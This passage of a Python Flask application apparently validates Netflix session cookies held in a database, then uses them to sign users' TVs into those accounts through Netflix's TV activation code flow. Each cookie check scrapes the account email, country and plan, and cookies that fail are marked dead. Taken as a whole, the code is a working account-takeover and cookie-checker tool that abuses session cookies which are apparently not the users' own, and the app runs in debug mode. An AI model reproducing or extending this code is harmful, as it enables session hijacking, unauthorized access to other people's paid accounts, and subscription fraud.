        html = tv8_resp.text

        # Check membership status from page
        membership_status = get_val(html, "membershipStatus")
        if membership_status and membership_status != "CURRENT_MEMBER":
            _mark_cookie_dead(netflix_id, f"Membership status: {membership_status}")
            return jsonify({
                'status': 'error',
                'message': f'Cookie does not have active subscription. Status: {membership_status}',
                'retry': True
            }), 400

        # Extract authURL — THIS IS THE KEY
        auth_url = get_auth_url(html)
        if not auth_url:
            logger.error(f"Could not extract authURL. HTML snippet: {html[:2000]}")
            return jsonify({
                'status': 'error',
                'message': 'Could not extract authURL from Netflix. Netflix may have changed their page.'
            }), 500

        logger.info(f"Extracted authURL: {auth_url[:50]}...")

        # ── Step 2b: POST /tv8 with the activation payload ──
        logger.info(f"Step 2: POST /tv8 with code {code[:2]}****")
        
        payload = {
            "flow": "websiteSignUp",
            "authURL": auth_url,
            "flowMode": "enterTvLoginRendezvousCode",
            "withFields": "tvLoginRendezvousCode,isTvUrl2",
            "tvLoginRendezvousCode": code,
            "action": "nextAction",
        }

        activate_resp = requests.post(
            "https://www.netflix.com/tv8",
            headers={
                "User-Agent": DESKTOP_UA,
                "Cookie": cookie_str,
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": "https://www.netflix.com/tv8",
                "Origin": "https://www.netflix.com",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            },
            data=urllib.parse.urlencode(payload),
            timeout=30,
            allow_redirects=False  # CRITICAL: Check redirect location manually
        )

        # ── Step 3: Parse result based on response ──
        success = False
        result_message = ""

        if activate_resp.status_code in (301, 302, 303, 307):
            location = activate_resp.headers.get("Location", "")
            logger.info(f"POST redirect to: {location}")
            
            if "/tv/out/success" in location or "success" in location.lower():
                success = True
                result_message = "TV activated successfully! Your TV should be signed in within 10-30 seconds."
            elif "/login" in location or "signin" in location.lower():
                _mark_cookie_dead(netflix_id, "Session dropped during TV activation")
                return jsonify({
                    'status': 'error',
                    'message': 'Session dropped while activating. The cookie may have expired.',
                    'retry': True
                }), 400
            else:
                result_message = f"Unexpected redirect: {location}"
                logger.warning(f"Unexpected redirect location: {location}")
        else:
            # Check response body for error messages
            err_text = activate_resp.text
            
            # Look for Netflix error message div
            nf_message_match = re.search(
                r'class="nf-message-contents"[^>]*>([\s\S]*?)<\/div>',
                err_text
            )
            if nf_message_match:
                result_message = re.sub(r'<[^>]+>', '', nf_message_match.group(1)).strip()
            else:
                # Check for other error indicators
                if "invalid" in err_text.lower() and "code" in err_text.lower():
                    result_message = "Invalid TV code. Please generate a new code on your TV."
                elif "expired" in err_text.lower():
                    result_message = "TV code has expired. Please generate a new one on your TV."
                elif "maximum" in err_text.lower() and "device" in err_text.lower():
                    result_message = "Maximum number of devices reached for this account."
                else:
                    result_message = "Failed to activate TV. Please check the code and try again."
            
            logger.warning(f"TV activation failed. Status: {activate_resp.status_code}, Message: {result_message}")
            logger.debug(f"Response body: {err_text[:1000]}")

        # Log the attempt
        log_tv_auth_attempt(user.id, code, "success" if success else "failed", request.remote_addr)

        if success:
            return jsonify({
                'status': 'success',
                'message': result_message
            })
        else:
            return jsonify({
                'status': 'error',
                'message': result_message
            }), 400

    except requests.RequestException as e:
        logger.error(f"Network error in TV auth: {str(e)}")
        return jsonify({'status': 'error', 'message': f'Network error: {str(e)}'}), 500
    except Exception as e:
        logger.error(f"TV auth exception: {str(e)}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({'status': 'error', 'message': f'Error: {str(e)}'}), 500


def _mark_cookie_dead(netflix_id, reason):
    """Mark a cookie as dead in the database"""
    try:
        supabase.table('netflix_accounts')\
            .update({
                'is_active': False,
                'deactivated_reason': reason,
                'deactivated_at': datetime.utcnow().isoformat()
            })\
            .eq('netflix_id', netflix_id)\
            .execute()
    except Exception as e:
        logger.error(f"Failed to mark cookie as dead: {e}")



def find_working_account_with_secure_id(user_id):
    """Find first working account that has BOTH NetflixId and SecureNetflixId"""
    try:
        result = supabase.table('netflix_accounts')\
            .select('*')\
            .eq('added_by', str(user_id))\
            .eq('is_active', True)\
            .not_.is_('secure_netflix_id', 'null')\
            .order('created_at', desc=True)\
            .execute()

        for account in result.data or []:
            netflix_id = account.get('netflix_id')
            secure_id = account.get('secure_netflix_id')
            
            if not netflix_id or not secure_id:
                continue

            # Quick validation with BOTH cookies
            cookie_dict = {
                "NetflixId": netflix_id,
                "SecureNetflixId": secure_id
            }
            is_valid, _ = validate_netflix_cookie_quick(cookie_dict)
            if is_valid:
                return account
            else:
                # Mark dead account
                supabase.table('netflix_accounts')\
                    .update({
                        'is_active': False,
                        'deactivated_reason': 'Failed validation during TV auth lookup',
                        'deactivated_at': datetime.utcnow().isoformat()
                    })\
                    .eq('id', account['id'])\
                    .execute()

    except Exception as e:
        logger.error(f"Error finding account with secure ID: {e}")

    return None


def log_tv_auth_attempt(user_id, code, status, ip_address):
    """Log TV authentication attempts"""
    try:
        headers = {
            'apikey': SUPABASE_SERVICE_KEY,
            'Authorization': f'Bearer {SUPABASE_SERVICE_KEY}',
            'Content-Type': 'application/json',
            'Prefer': 'return=representation'
        }

        log_data = {
            'user_id': str(user_id),
            'tv_code': code[:4] + '****',
            'status': status,
            'ip_address': str(ip_address) if ip_address else None
        }

        url = f"{SUPABASE_URL}/rest/v1/tv_auth_logs"
        resp = requests.post(url, headers=headers, json=log_data)

        if resp.status_code == 201:
            logger.info(f"TV auth log SUCCESS")
        else:
            logger.error(f"TV auth log FAILED: {resp.status_code}")

    except Exception as e:
        logger.error(f"TV auth log error: {str(e)}")

def validate_netflix_cookie_quick(cookie_dict):
    """
    Quick validation of Netflix cookies. Accepts dict with NetflixId and optionally SecureNetflixId.
    Returns (is_valid, account_info_or_error)
    """
    session = requests.Session()
    session.cookies.update(cookie_dict)
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    
    try:
        resp = session.get('https://www.netflix.com/YourAccount', headers=headers, timeout=15)
        txt = resp.text
        txt_lower = txt.lower()
        
        # Check for login redirect
        if '"mode":"login"' in txt_lower or 'signin' in resp.url.lower():
            missing_secure = not cookie_dict.get('SecureNetflixId')
            return False, {
                'err': 'Cookie expired - redirected to login' + (' (missing SecureNetflixId?)' if missing_secure else ''),
                'needs_recheck': True
            }
        
        # Check for account page
        if '"mode":"yourAccount"' not in txt:
            if 'payment' in txt_lower and ('update' in txt_lower or 'required' in txt_lower):
                return False, {'err': 'Payment method update required'}
            if 'membership has been canceled' in txt_lower:
                return False, {'err': 'Membership cancelled'}
            if 'restart' in txt_lower and 'membership' in txt_lower:
                return False, {'err': 'Membership expired'}
            if 'unauthorized' in txt_lower or 'session expired' in txt_lower:
                return False, {'err': 'Session expired'}
            if 'on hold' in txt_lower:
                return False, {'err': 'Membership on hold'}
            return False, {'err': 'Not logged in - invalid cookie'}
        
        # Check membership status
        status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        if status_match:
            status = status_match.group(1)
            if status != 'CURRENT_MEMBER':
                return False, {'err': f'Membership status: {status}'}
        
        # Extract basic info
        email_match = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', txt)
        email = email_match.group(1) if email_match else 'Unknown'
        
        country_match = re.search(r'"currentCountry"\s*:\s*"([^"]+)"', txt)
        country = country_match.group(1) if country_match else 'Unknown'
        
        plan_match = re.search(r'"planName"\s*:\s*"([^"]+)"', txt)
        plan = plan_match.group(1) if plan_match else 'Unknown'
        
        is_premium = '"isuhdavailable":true' in txt_lower or 'premium' in plan.lower()
        
        return True, {
            'email': email,
            'country': country,
            'plan': plan,
            'is_premium': is_premium
        }
        
    except requests.RequestException as e:
        return False, {'err': f'Network error: {str(e)}'}
    except Exception as e:
        return False, {'err': f'Validation error: {str(e)}'}

#--------------------------------------------------------------

if __name__ == '__main__':
    app.run(debug=True)
